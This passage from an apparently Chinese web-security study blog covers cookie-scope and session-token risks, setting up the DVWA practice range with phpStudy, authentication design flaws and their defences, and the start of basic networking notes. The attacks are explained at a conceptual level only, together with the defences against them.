title="客户端暴露在令牌劫持风险之中"></a>客户端暴露在令牌劫持风险之中</h3><p>攻击者可以采用各种方法向应用程序的其他用户发起攻击，试图截获或滥用他们的会话令牌</p><ul><li>攻击者可以通过跨站点脚本攻击查询用户的cookie，获得他们的会话令牌，然后将其传送至自己控制的任意服务器。(请参阅Web安全(10))</li><li>会话固定攻击：攻击者向一名用户发送一个已知的会话令牌，等待他登录，然后劫持他的会话</li><li>跨站点请求伪造攻击：攻击者从他控制的一个Web站点向应用程序提出一个专门设计的请求，由于用户的浏览器会随同这个请求一起自动提交用户当前的cookie，攻击者会因此获得用户的cookie。(请参阅Web安全(10))</li></ul><h3 id="宽泛的cookie范围"><a href="#宽泛的cookie范围" class="headerlink" title="宽泛的cookie范围"></a>宽泛的cookie范围</h3><p>cookie的工作机制可简单概括如下：</p><ul><li>服务器使用HTTP响应消息头Set-Cookie发布一个cookie，然后浏览器在随后的请求中使用Cookie消息头向同一台服务器重新提交这个cookie。</li><li>cookie机制允许服务器指定将每个cookie重新提交到哪个域和哪个URL路径。为完成这一任务，它在Set-Cookie指令中使用domain和path属性</li></ul><h4 id="cookie域限制"><a href="#cookie域限制" class="headerlink" title="cookie域限制"></a>cookie域限制</h4><ul><li>位于foo.wahh-app.com的应用程序在建立一个cookie后，浏览器会默认在随后的所有请求中将cookie重新提交到foo.wahh-app.com及任何子域（如admin.foo.wahh-app.com）。它不会将cookie提交给其他任何域，包括父域wahh-app.com和父域的其他任何子域(如bar.wahh-app.com)</li><li>服务器可以在Set-Cookie指令中插入一个domain属性，以改变这种默认行为。假设位于foo.wahh-app.com的应用程序返回下列HTTP消息头：<pre class=" language-bash"><code class="language-bash">Set-Cookie: sessionId<span class="token operator">=</span>19284701<span class="token punctuation">;</span>domain<span class="token operator">=</span>wahh-app.com</code></pre>浏览器会将这个cookie重新提交给wahh-app.com的所有子域，包括bar.wahh-app.com</li></ul><blockquote><p>注：服务器不能使用domain随意指定域。首先，指定的域要么必须是应用程序在其上运行的域，要么是它的父域(或为直接父域，或有一定间隔）。其次，指定的域不能为.com或.co.uk之类的顶级域，因为这样做会允许恶意服务器在其他任何域上建立任意cookie。如果浏览器违反以上任何一条规定，浏览器将完全忽略Set-Cookie指令</p></blockquote><h5 id="cookie范围设定过广"><a href="#cookie范围设定过广" class="headerlink" title="cookie范围设定过广"></a>cookie范围设定过广</h5><p>如果应用程序将cookie范围设定得过于宽泛，也可能会使应用程序出现各种安全漏洞:</p><ol><li>以一个允许用户注册、登录、写博客、阅读他人博客应用程序为例。</li></ol><ul><li>它的主应用程序位于域wahh-blogs.com上，当用户登录这个应用程序时，他会从一个以wahh-blogs.com这个域为范围的cookie中收到会话令牌。每名用户都可以创建自己的博客，通过以用户名为前缀的一个新的子域进行访问，如：<br><font color="#fb8c00">fightingtree.wahh-blogs.com</font><br><font color="#fb8c00">hero.wahh-blogs.com</font></li><li>因为cookie被自动重新提交到这个范围内的每一个子域，当一名已经登录的用户浏览其他用户的博客时，他的会话令牌与其请求一起提交。</li><li>如果允许博客作者在他们自己的博客中插入任意JavaScript脚本，那么一个恶意博客作者就能够以和保存型跨站点脚本攻击一样的方式窃取其他用户的会话令牌。</li></ul><ol start="2"><li>之所以会出现这样的问题，是因为用户创作的博客是处理验证和会话管理的主应用程序的子域。HTTP cookie并没有能力帮助应用程序防止主域发布的cookie被重新提交给它的子域。</li><li>要解决这个问题，主应用程序可以使用一个不同的域名(如www. wahh-blogs.com），并以这个完全合格的域名作为它的会话令牌cookie的域范围。这样，如果登录用户浏览其他用户的博客，会话cookie就不会被提交。</li></ol><h5 id="cookie指定父域为cookie域范围"><a href="#cookie指定父域为cookie域范围" class="headerlink" title="cookie指定父域为cookie域范围"></a>cookie指定父域为cookie域范围</h5><p>如果一个应用程序明确以一个父域作为它的cookie域范围，就会出现漏洞。<br>假设一个安全性至关重要的应用程序位于域sensitiveapp.wahh-organization.com上，当它建立cookie时，它自由设置的域范围如下：<br><font color="#fb8c00">Set-Cookie: sessionId=12df098ad809a5219; domain=wahh-organization.com</font><br>这样造成的后果是：当用户访问wahh-organization.com使用的每一个子域时，机密应用程序的会话令牌cookie都被提交，这些子域包括：<br><font color="#fb8c00">www. wahh-organization.com</font><br><font color="#fb8c00">testapp.wah-organization.com</font><br>由于以下原因，不应将敏感应用程序的cookie提交给其他应用程序</p><ul><li>负责其他应用程序的人员与负责机密应用程序的人员的信任级别不同</li><li>与前面的博客应用程序一样，其他应用程序的功能可能会将提交给应用程序的cookie值泄露给第三方</li><li>其他应用程序可能并不安全，但外部攻击者可以利用一个不安全的应用程序截获由机密应用程序创建的会话令牌。</li></ul><h4 id="cookie路径限制"><a href="#cookie路径限制" class="headerlink" title="cookie路径限制"></a>cookie路径限制</h4><p>位于/apps/secure/foo-app/index.jsp的应用程序建立一个cookie后，浏览器会默认在随后的所有请求中将cookie重新提交到路径/apps/secure/foo-app/及任何子目录。它不会将cookie提交到父目录或服务器上的任何目录路径。服务器可以在Set-Cookie指令中插入一个path属性，改变这种默认行为。例如，如果应用程序返回以下HTTP消息头：</p><pre class=" language-bash"><code class="language-bash">Set-Cookie: sessionId<span class="token operator">=</span>187ab023e09c00a881a<span class="token punctuation">;</span> path<span class="token operator">=</span>/apps/<span class="token punctuation">;</span></code></pre><p>那么浏览器会将这个cookie重新返回到/apps/路径的所有子目录中</p><h2 id="保障会话管理的安全"><a href="#保障会话管理的安全" class="headerlink" title="保障会话管理的安全"></a>保障会话管理的安全</h2><h3 id="生成强大的令牌"><a href="#生成强大的令牌" class="headerlink" title="生成强大的令牌"></a>生成强大的令牌</h3><p>最有效的令牌生成机制应具备以下两点：</p><ul><li>使用数量及其庞大的一组可能值</li><li>包含强大的随机源，确保令牌以无法预测的方式平均分布在其可能值范围内</li></ul><h3 id="在整个生命周期保障令牌的安全"><a href="#在整个生命周期保障令牌的安全" class="headerlink" title="在整个生命周期保障令牌的安全"></a>在整个生命周期保障令牌的安全</h3><ul><li>令牌只能通过HTTPS传送</li><li>绝不能在URL中传送会话令牌</li><li>应总是执行退出功能</li><li>防止并行登录</li><li>尽可能限制cookie的域和路径范围</li><li>不应接受用户提交、但服务器不认可的任意令牌</li><li>在执行转账之类的重要操作之前，要求进行两步确认或重新验证可有效防御跨站点请求伪造或其他会话攻击</li><li>不完全依赖HTTP cookie传送会话令牌可防御跨站点请求伪造攻击</li><li>成功验证后应总是建立一个新的会话，以避免会话固定攻击的影响。</li></ul><h4 id="每页面令牌"><a href="#每页面令牌" class="headerlink" title="每页面令牌"></a>每页面令牌</h4><ul><li>应在会话令牌的基础上使用每页面令牌。</li><li>使用每页面令牌时，每次用户请求一个应用程序页面（例如，不是图像),应用程序都会建立一个新的页面令牌，并通过cookie或HTML表单隐藏字段将其传送给客户端。</li><li>用户每次都提出一个请求，除通过主会话令牌进行正常确认外，页面令牌还根据最后发布的令牌值进行再次检验。</li><li>如果出现不匹配的情况，整个会话将被终止</li></ul><h3 id="日志、监控与警报"><a href="#日志、监控与警报" class="headerlink" title="日志、监控与警报"></a>日志、监控与警报</h3><ul><li>应用程序应监控包含无效令牌的请求</li><li>很难完全阻止针对会话令牌的蛮力攻击，因为我们无法禁用特殊用户账户或会话来终止这种攻击</li></ul><h4 id="反应性会话终止"><a href="#反应性会话终止" class="headerlink" title="反应性会话终止"></a>反应性会话终止</h4><p>如果收到用户提交的反常请求，那么一些安全性至关重要(如电子银行)会极其迅速地终止用户的会话</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpStudy1</title>
      <link href="/2019/11/04/phpstudy1/"/>
      <url>/2019/11/04/phpstudy1/</url>
      
        <content type="html"><![CDATA[<h2 id="phpStudy搭建网站"><a href="#phpStudy搭建网站" class="headerlink" title="phpStudy搭建网站"></a>phpStudy搭建网站</h2><p>phpStudy的安装路径不能含有中文</p><ol><li>在phpStudy安装包下找到WWW，在WWW中新建文件夹，这里我创建的是test文件夹，test文件夹里就是网站程序，如下图所示<br><img src="https://i.postimg.cc/nrsFjJff/1.jpg" alt=""></li><li>在phpStudy中开启相应服务<br><img src="https://i.postimg.cc/3NPK2c34/2.png" alt=""></li><li>创建网站<br><img src="https://i.postimg.cc/bYMNXs1y/3.png" alt=""></li><li>站点域名配置<br><img src="https://i.postimg.cc/PrwfdTMm/4.png" alt=""></li><li>更改hosts文件<br><img src="https://i.postimg.cc/x1G0b5h8/host.png" alt=""><br>打开hosts文件之后，在文件最后一行加上 <font color="#fb8c00">127.0.0.1 <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></font></li></ol><p>在浏览器输入域名<font color="#fb8c00"><a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></font>即可访问站点</p><h2 id="phpStudy搭建DVWA靶场"><a href="#phpStudy搭建DVWA靶场" class="headerlink" title="phpStudy搭建DVWA靶场"></a>phpStudy搭建DVWA靶场</h2><h3 id="登录数据库"><a href="#登录数据库" class="headerlink" title="登录数据库"></a>登录数据库</h3><p>访问WWW文件夹下的phpMyAdmin文件：</p><pre class=" language-bash"><code class="language-bash">localhost:8081/phpMyAdmin/index.php</code></pre><p>出现如下图所示：<br><img src="https://i.postimg.cc/1RpHnHNn/5.jpg" alt=""><br>登录数据库</p><h3 id="登录DVWA首页"><a href="#登录DVWA首页" class="headerlink" title="登录DVWA首页"></a>登录DVWA首页</h3><ol><li><p>解压DVWA文件夹(解压后的文件夹名是DVWA-master)</p></li><li><p>放入phpStudy的WWW文件夹下，按照上述搭建网络的步骤来搭建DVWA靶场。</p></li><li><p>打开DVWA-master下的config目录，将目录下的文件<font color="#fb8c00">config.inc.php.dist</font>的文件名去掉后缀变为<font color="#fb8c00">config.inc.php</font></p></li><li><p>使用第2步设置的域名访问DVWA主页，如图：<br><img src="https://i.postimg.cc/cL5MykPj/7.jpg" alt=""></p></li><li><p>选择页面末尾create database选项，出现下图所示的错误：<br><img src="https://i.postimg.cc/dVXdSkyc/8-jpg.png" alt=""></p></li><li><p>打开第3步的配置文件，修改下图所示的两个选项(用户名和密码为登录phpMyAdmin数据库的密码)<br><img src="https://i.postimg.cc/MKqYyQys/6.png" alt=""></p></li><li><p>登录DVWA，初始用户名为admin,密码为password,到达下述图片则说明DVWA靶场搭建成功<br><img src="https://i.postimg.cc/zBYh8s7d/9.jpg" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> phpStudy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(5)</title>
      <link href="/2019/11/04/websecurity5/"/>
      <url>/2019/11/04/websecurity5/</url>
      
        <content type="html"><![CDATA[<h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h2><ul><li>验证机制是Web应用程序所有安全机制中最简单的一种机制。通常，应用程序必须核实用户提交的用户名和密码是否正确，如果正确，则允许用户登录，否则禁止用户登录。</li><li>验证机制意识应用程序防御恶意攻击的中心机制。它处在防御未授权访问的最前沿，如果用户能够突破这些防御，他们通常能够控制应用程序的全部功能，自由访问其中保存的数据。</li></ul><h2 id="验证技术"><a href="#验证技术" class="headerlink" title="验证技术"></a>验证技术</h2><p>当执行验证机制时,Web应用程序开发者可以采用各种不同的技术：</p><ul><li>基于HTML表单的验证</li><li>多元机制，如组合型密码和物理令牌</li><li>客户端SSL证书或智能卡</li><li>HTTP基本和摘要验证</li><li>使用NTLM或Kerberos整合Windows验证</li><li>验证服务</li></ul><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><ul><li>Web应用程序中最常用的验证机制是使用HTML表单获取用户名和密码</li><li>在更加注重安全的应用程序中(电子银行)，这种基本机制扩展到几个阶段，要求用户提交其他证书，如PIN号码或从机密字中选择字符。HTML表单仍主要用于获取相关数据</li><li>最为注重安全的应用程序(进行巨额交易的私人银行)通常采用使用物理令牌的多元机制，这些令牌通常产生一组一次性口令，或者根据应用程序指定的输入执行一个质询-响应功能。</li><li>由于成本高昂，只有一些用户不多的安全极其重要的应用程序才会使用客户端SSL证书或在智能卡中执行加密机制，</li><li>因特网上的应用程序很少采用基于HTTP的验证机制，企业内联网更常采用这种机制。这时，阻止内部用户提供标准的网络或域证书，应用程序通过以上一种技术对其进行处理，再允许用户访问企业应用程序</li></ul><h2 id="验证机制设计缺陷"><a href="#验证机制设计缺陷" class="headerlink" title="验证机制设计缺陷"></a>验证机制设计缺陷</h2><h3 id="密码保密性不强"><a href="#密码保密性不强" class="headerlink" title="密码保密性不强"></a>密码保密性不强</h3><p>许多Web应用程序没有或很少对用户密码的强度进行控制。应用程序常常使用下列形式的密码：</p><ul><li>非常短或空白的密码</li><li>以常用的字典词汇或名称为密码</li><li>密码和用户名完全相同</li><li>仍然使用默认密码</li></ul><h3 id="蛮力攻击登录"><a href="#蛮力攻击登录" class="headerlink" title="蛮力攻击登录"></a>蛮力攻击登录</h3><ul><li>使用不同的密码重复进行登录尝试，直到找到正确密码。</li><li>一些应用程序使用客户端控件防止密码猜测攻击，例如，某个应用程序可能会设置cookie-failedlogins=1，如果登录失败，递增这个值，达到某个上限后，服务器将在提交的cookie中检测这个值，并拒绝处理登录尝试。</li></ul><h4 id="详细的失败信息"><a href="#详细的失败信息" class="headerlink" title="详细的失败信息"></a>详细的失败信息</h4><p>一个典型的登录表单要求用户输入两组信息(用户名或密码),如果应用程序对哪一组信息出错进行提示(如密码错误/用户名错误),就可以利用它显著降低登录机制的防御效能。如果登录时显示用户名出错，攻击者就可以发动一次自动化攻击，遍历大量常见的用户名,确定哪些有效。</p><h3 id="证书传输易受攻击"><a href="#证书传输易受攻击" class="headerlink" title="证书传输易受攻击"></a>证书传输易受攻击</h3><p>如果应用程序使用非加密的HTTP链接传输登录证书，处于网络适当位置的窃听者当然就能拦截这些证书。根据用户的位置，窃听者可能位于：</p><ul><li>用户的本地网络中</li><li>用户的IT部门内</li><li>用户的ISP内</li><li>因特网骨干网上</li><li>托管应用程序的ISP内</li><li>管理应用程序的IT部门内</li></ul><p>即使是通过HTTPS登录，如果应用程序处理证书的方式不安全，证书仍可能被泄露给未授权方</p><ul><li>如果以查询字符串参数、而不是POST请求主体中传送证书，许多地方都可能记录这些证书(如用户的浏览历史记录中、Web服务器日志以及主机基础架构采用的任何反向代理中)，如果攻击者成功攻破这些资源，就能够获取保存在这些地方的用户证书，从而提升其访问权限</li><li>虽然大多数Web应用程序确实使用POST请求主体提交HTML提交表单，但是，应用程序常常通过重定向到一个不同的URL来处理登录请求，然后以查询字符串的形式提交证书</li><li>Web应用程序有时将证书保存在cookie中，通常是为了执行设计不佳的登录、密码修改、“记住我”等机制。攻击者通过攻击用户cookie即可获取这些证书(在Web安全(10)中会介绍这种方法)</li></ul><p>许多应用程序对应用程序中未经验证的区域使用HTTP，而在登录时转而使用HTTPS。如果是这样，应在向浏览器加载登录页面时转换到HTTPS，使得用户能够在输入证书之前判断页面是否真实可信。但是，一些应用程序往往使用HTTP加载登录界面，而在提交证书时才转换到HTTPS，这种做法是不安全的，因为用户无法核实登录页面的真实性。这时，处在适当位置的攻击者就能拦截并修改登录界面，更改登录表单的目标URL以及使用的HTTP。</p><h3 id="密码修改功能"><a href="#密码修改功能" class="headerlink" title="密码修改功能"></a>密码修改功能</h3><p>定期强制修改密码可降低某一密码成为密码猜测攻击目标的可能性，同时降低攻击者不需要检测即可使用被攻破密码的可能性。虽然密码修改功能不需要验证即可访问，但在主要登录功能中特意避免的漏洞通常在密码修改功能中反复出现。许多Web应用程序的密码修改功能不需要验证即可访问，并为攻击者提供某些信息或允许攻击者执行某些操作。</p><ul><li>提供详细的错误信息，说明被请求的用户名是否有效</li><li>允许攻击者无限制猜测“现有密码”字段</li><li>在验证现有密码后，仅检查“新密码”和“确认新密码”字段的值是否相同，允许攻击者不需入侵即可成功查明现有密码<br>典型的密码修改功能通常包含一个相对较大的逻辑判定树，应用程序需要确认用户、验证提供现有的密码、集成任何账户锁定防御、对提交的新密码互相进行比较并根据密码强度规则进行比较，以及以适当的方式向用户返回任何错误条件。为此，密码修改功能通常包含难以察觉的用于破坏整个机制的逻辑缺陷。</li></ul><h3 id="忘记密码功能"><a href="#忘记密码功能" class="headerlink" title="忘记密码功能"></a>忘记密码功能</h3><p>重新获得忘记密码的机制常常会引入已在主要登录功能中避免的问题，如用户名枚举。忘记密码功能设计方面的缺点往往使它成为应用程序总体验证机制最薄弱的环节。下面介绍几种缺点：</p><ul><li>忘记密码功能常常向用户提出一个次要质询以代替主要登录界面。对于攻击者来说，响应这种质询比猜测用户密码更为简单。</li><li>当应用程序允许无限制地回答密码恢复质询时，攻击者可以对其发动蛮力攻击</li><li>一些应用程序在用户成功完成一个质询后，立即让其进入一个不需验证的会话，这使得攻击者在攻破质询后可以无限制地使用该用户，而不会被账号所有者察觉</li><li>在用户正确响应一个质询后，应用程序允许用户重新控制他们的账户，这种机制非常容易受到攻击。执行这种机制的一个相对安全的方法是向用户在注册阶段提供的电子邮箱中发送一个唯一的、无法猜测的、存在时间限制的恢复URL，用户在几分钟内访问这个URL即可重置一个新密码</li><li>一些应用程序采用发送一个唯一的恢复URL的机制，但将这个URL发送至用户在完成质询时指定的电子邮箱中，除能够记录攻击者的电子邮箱外，这种方法根本无法提高恢复过程的安全性。</li><li>一些应用程序允许用户在完成质询后直接重置密码，并不会向用户发送任何电子邮件通知。这意味着直到所有者碰巧再次登录时才会注意到账户被攻击者攻破，或者账号所有者会认为是自己忘记了密码，于是用上述方法重置密码，这种情况下的所有者不会发现自己的账户已被攻破。</li></ul><blockquote><p>注：即使应用程序并未在屏幕上显示字段，要求用户输入接收恢复URL的电子邮箱地址，它仍有可能通过一个隐藏表单字段或cookie传送这个地址。攻击者此时即可以发现用户的电子邮箱，又可以对这个地址进行修改，用自选的地址接收恢复URL地址。</p></blockquote><h3 id="“记住我”功能"><a href="#“记住我”功能" class="headerlink" title="“记住我”功能"></a>“记住我”功能</h3><p>为方便用户，避免用户在同一台计算机上重复输入账号与密码，应用程序通常执行“记住我”功能。这项功能在设计上并不安全，致使用户易于遭受本地和其他计算机用户的攻击。</p><ul><li>一些“记住我”功能通过一个简单的cookie执行，如RememberUser=peterwinener。向初始应用程序界面提交这个cookie时，应用程序信任该cookie，认为其属于通过验证的用户，并为该用户创立一个应用程序会话，从而避开登录过程。攻击者可以使用一组常见或已枚举出的用户名，不需要任何验证即可完全访问应用程序。</li><li>一些“记住我”功能设置一个cookie，其中并不包含用户名，而是使用一个持久会话标识符，例如RememberUser=1328。向登录页面提交这个标识符时，应用程序查询与其相关的用户，并为该用户建立一个应用程序会话</li><li>即使cookie中保存的用于识别用户的信息得到适当保护，但攻击者仍可通过跨站点脚本之类的漏洞或本地访问用户的计算机获得这些信息(请参阅Web安全(10)了解相关内容)</li></ul><h3 id="用户伪装功能"><a href="#用户伪装功能" class="headerlink" title="用户伪装功能"></a>用户伪装功能</h3><p>一些应用程序允许特权用户伪装成其他用户，以在该用户的权限下访问数据和执行操作(例如，一些银行应用程序允许服务台操作员口头验证一名电话用户，然后将银行的应用程序会话转换到该用户的权限下，以为其提供帮助)，这种功能存在的缺陷主要有：</p><ul><li>伪装功能可以通过“隐藏”功能的形式执行，不受常规访问控制管理。(例如，任何知道或猜测出URL/admin/ImpersonateUser.jsp的人都能利用该功能伪装成任何其他用户(请参阅Web安全(7)了解相关内容)</li><li>当判定用户是否进行伪装时，应用程序可能会信任由用户控制的数据。例如，除有效会话令牌外，用户可能会提交一个指定其会话当前所使用的账户的cookie。攻击者可以修改这个值，不需验证即可通过其他用户的账户访问应用程序</li><li>某种伪装功能能够以简单的“后门”密码的形式执行，改密码可和任何用户名一起向标准登录页面提交，以作为该用户进行验证。如果攻击者对登录机制发动暴力攻击，并在匹配真实密码之前成功匹配后门密码，那么攻击者就可能发现后门密码功能，从而访问每一名用户的账户。</li></ul><h2 id="验证机制执行缺陷"><a href="#验证机制执行缺陷" class="headerlink" title="验证机制执行缺陷"></a>验证机制执行缺陷</h2><h3 id="多阶段登录机制中的缺陷"><a href="#多阶段登录机制中的缺陷" class="headerlink" title="多阶段登录机制中的缺陷"></a>多阶段登录机制中的缺陷</h3><ul><li>输入用户名和密码</li><li>响应一个质询，答案是PIN中的特殊数字或一个值得纪念的词</li><li>提交在不断变化的物理令牌上显示的某个值<br>通常，多阶段登录机制首先要求用户通过用户名或类似数据项确认自己的身份，随后，登录阶段再执行各种验证检查，这种机制常常存在安全漏洞，特别是逻辑缺陷</li></ul><blockquote><p>注：多阶段登录机制不一定比标准的用户名/密码登录安全，如果一个多阶段登录机制存在多个执行缺陷，它甚至没有标准登录安全</p></blockquote><p>在执行过程中，一些多阶段登录机制对用户与早先阶段的交互做出潜在的不安全的假设，比如：</p><ul><li>应用程序可能认为访问第三阶段的用户已经完成第一、二阶段的验证。因此，它可能允许直接由第一阶段直接进入到第三阶段并且提供正确证书的攻击者通过验证，使仅拥有部分正常登录所需的各种证书的攻击者能够成功登录</li><li>应用程序可能会信任第二阶段处理的一些数据，因为这些数据已经在第一阶段得到确认。但是，攻击者能够在第二阶段操纵这些数据，提供一个不同于第一阶段的值。</li></ul><h3 id="不安全的证书存储"><a href="#不安全的证书存储" class="headerlink" title="不安全的证书存储"></a>不安全的证书存储</h3><p>Web应用程序常常以危险的方式将用户证书存储在数据库中，这包括以明文形式存储密码。但是，即使使用MD5或SHA-1等标准算法对密码进行散列处理，攻击者仍然可以在预先计算的散列值数据库中查找观察到的散列。因为应用程序使用的数据库必须随时读/写这些证书，攻击者可以利用应用程序中的许多其他漏洞访问这些证书，例如，命令、SQL注入漏洞或访问控制漏洞</p><h2 id="保障验证机制的安全"><a href="#保障验证机制的安全" class="headerlink" title="保障验证机制的安全"></a>保障验证机制的安全</h2><h3 id="使用可靠的证书"><a href="#使用可靠的证书" class="headerlink" title="使用可靠的证书"></a>使用可靠的证书</h3><ul><li>应强制执行适当的最小密码强度要求</li><li>应使用唯一的用户名</li><li>系统生成的任何用户名和密码应具有足够随机性，其中不包含任何顺序，即使攻击者访问大量连续生成的实例也无法对其进行预测</li><li>允许用户设置足够强大的密码</li></ul><h3 id="安全处理证书"><a href="#安全处理证书" class="headerlink" title="安全处理证书"></a>安全处理证书</h3><ul><li>应以不会造成非授权泄露的方式创建、保存和传送所有证书</li><li>应使用公认的加密技术(如SSL)保护客户端与服务器端的所有通信。既无必要也无需要使用定制解决方案保护传输中的数据</li><li>如果认为最好在应用程序的不需验证的区域使用HTTP，必须保证使用HTTPS加载登录表单，而不是在提交登录信息时才转到HTTPS</li><li>只能使用POST请求向服务器传输证书，绝不能将证书放在URL参数或cookie中(即使临时放置也不行)。绝不能将证书返回给客户端，即使是通过重定向参数传送也不行。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络知识点总结</title>
      <link href="/2019/10/30/network1/"/>
      <url>/2019/10/30/network1/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="因特网概述"><a href="#因特网概述" class="headerlink" title="因特网概述"></a>因特网概述</h3><ol><li>网络指的是：电信网络、有线电视网络、计算机网络</li><li>计算机网络向用户提供的功能：</li></ol><ul><li>连通性：计算机网络使上网的用户都能交换信息</li><li>共享：即资源共享。</li></ul><h4 id="网络的网络"><a href="#网络的网络" class="headerlink" title="网络的网络"></a>网络的网络</h4><ul><li>网络(network)由若干结点(node)和连接这些结点的链路(link)组成</li><li>互联网是网络的网络(network of networks)</li><li>连接在因特网上的计算机都称为主机(host)</li></ul><blockquote><p>注：网络中的Node应译为结点而不是节点</p></blockquote><h4 id="网络和因特网"><a href="#网络和因特网" class="headerlink" title="网络和因特网"></a>网络和因特网</h4><ul><li>网络把许多计算机连接在一起</li><li>因特网则把许多网络连接在一起</li></ul><h4 id="因特网发展的三个阶段"><a href="#因特网发展的三个阶段" class="headerlink" title="因特网发展的三个阶段"></a>因特网发展的三个阶段</h4><ol><li>第一阶段是从单个网络ARPANET向互联网发展的过程。</li><li>第二阶段是建成了三级结构的因特网：主干网、地区网和校园网(或企业网)</li><li>形成了多层次ISP结构的因特网。(因特网服务提供者ISP,Internet Service Provider)<br>主机通过ISP连接到因特网中(上网)。</li></ol><h5 id="internet和Internet的区别"><a href="#internet和Internet的区别" class="headerlink" title="internet和Internet的区别"></a>internet和Internet的区别</h5><ul><li>internet泛指由多个计算机网络互连而成的网络</li><li>Internet指当前全球最大的、开放的、由众多网络相互连接而成的特定计算机网络，它采用TCP/IP协议族作为通信规则，其前身是美国的单个网络ARPANET</li></ul><h4 id="因特网的标准化工作"><a href="#因特网的标准化工作" class="headerlink" title="因特网的标准化工作"></a>因特网的标准化工作</h4><p><img src="https://ae01.alicdn.com/kf/Hd3df5adcf3764f9880775570c9a390653.jpg" alt=""></p><h3 id="因特网组成"><a href="#因特网组成" class="headerlink" title="因特网组成"></a>因特网组成</h3><p>从因特网的工作方式上看，可以划分为以下两个部分：</p><ol><li>边缘部分：由所有连接在因特网上的主机组成。这部分是用户直接使用的，用来进行通信和资源共享</li><li>核心部分: 由大量网络和连接这些网络的路由器组成，这部分是为边缘部分提供服务的(提供连通性和交换)<br><img src="https://ae01.alicdn.com/kf/H8dfa89d83970404b8db435a28ff85b27K.jpg" alt=""></li></ol><h4 id="因特网的边缘部分"><a href="#因特网的边缘部分" class="headerlink" title="因特网的边缘部分"></a>因特网的边缘部分</h4><p>处在因特网边缘的部分就是连接在因特网上的所有的主机。这些主机又称为端系统。主机之间的通信实际上是运行在主机上的某个进程(程序)之间的通信。</p><h5 id="两种通信方式"><a href="#两种通信方式" class="headerlink" title="两种通信方式"></a>两种通信方式</h5><p>在网络边缘的端系统运行的程序之间的通信方式通常可划分为两大类：</p><ul><li>客户-服务器方式(C/S方式)</li><li>对等方式(P2P方式)</li></ul><ol><li>客户-服务器方式</li></ol><ul><li>客户(client)和服务器(server)都是指通信中涉及的两个应用进程</li><li>客户-服务器方式所描述的是进程之间服务和被服务的关系</li><li>客户是服务的请求方，服务器是服务的提供方<br>客户软件的特点：被用户调用后运行，在打算通信时主动向远程服务器发起通信(请求服务)，因此客户程序必须知道服务器程序的地址。<br>服务器软件的特点：可以同时处理多个远程或本地客户的请求。系统启动后即自动调用并一直不断地运行，被动地等待并接收来自各地的客户的通信请求。因此，服务器程序不需要知道客户程序的地址</li></ul><ol start="2"><li>对等连接方式</li></ol><ul><li>对等连接(peer-to-peer，简写为P2P2)是指两个主机在通信时不区分哪一个是服务请求方还是服务提供方。</li><li>只要两个主机都运行了对等连接软件(P2P)软件，它们就可以进行平等的、对等连接通信。</li><li>对等连接方式从本质上看仍是使用客户-服务器方式，只是对等连接中的每一个主机既是客户同时又是服务器。</li></ul><h4 id="因特网的核心部分"><a href="#因特网的核心部分" class="headerlink" title="因特网的核心部分"></a>因特网的核心部分</h4><ul><li>网络中的核心部分要向网络边缘中的大量主机提供连通性，使边缘中的任何一个主机都能够和其他主机通信(即传送或接收各种数据)。</li><li>在网络核心部分起特殊作用的是路由器(router)</li><li>路由器是实现分组交换(packet switching)的关键组件，其任务是转发收到的分组，这是网络核心部分最重要的功能。</li></ul><h5 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h5><ol><li>分组交换的传输单元：分组交换网以“分组”作为数据传输单元，依次把各分组发送到接收端。(分组由首部和数据构成)</li><li>分组首部的重要性：</li></ol><ul><li>每一个分组的首部都含有地址等控制信息</li><li>分组交换网中的结点交换机根据收到的分组的首部中的地址信息，把分组转发到下一个结点交换机</li><li>存储转换机制是指交换机能够开始向链路输出端传输该分组的第一比特之前，必须接收到整个分组。</li><li>用这种分组交换、存储转发的方式，最后分组就能到达接收端</li></ul><ol start="3"><li>接收端在收到分组后剥去首部还原成报文</li></ol><h5 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h5><p>在路由器的输入和输出端口之间没有直接连线<br>路由器处理分组的过程是：</p><ul><li>把收到的分组先放入缓存(暂时存储)</li><li>查找转发表，找到某个目的地址应从哪个端口转发</li><li>把分组送到适当的端口转发出去。</li></ul><h3 id="计算机网络的分类"><a href="#计算机网络的分类" class="headerlink" title="计算机网络的分类"></a>计算机网络的分类</h3><ol><li>根据作用范围来分：</li></ol><ul><li>广域网WAN(Wide Area Network)</li><li>局域网LAN(Local Area Network)</li><li>城域网MAN(Metropolitan Area Network)</li><li>个人区域网PAN(Personal Area Network)</li></ul><ol start="2"><li>从网络使用者进行分类</li></ol><ul><li>公用网(public network)</li><li>专用网(private network)</li></ul><ol start="3"><li>把用户接入到因特网的网络</li></ol><ul><li>接入网AN(Access Network),它又被称为本地接入网或居民接入网</li><li>由ISP提供的接入网只是起到让用户能够与因特网连接的桥梁作用</li></ul><h3 id="计算机网络的性能"><a href="#计算机网络的性能" class="headerlink" title="计算机网络的性能"></a>计算机网络的性能</h3><ol><li>速率：</li></ol><ul><li>比特bit是计算机中数据量的单位</li><li>速率即数据量或比特率，速率的单位是b/s,kb/s,Mb/s,Gb/s</li></ul><ol start="2"><li>带宽：是指数字信道所能传送的“最高数据率”</li><li>吞吐量(throughput):表示在单位时间内通过某个网络的数据量。</li><li>时延：发送数据时，从发送数据的第一个比特算起到该帧的最后一个比特发送完毕所需的时间</li></ol><h4 id="时延"><a href="#时延" class="headerlink" 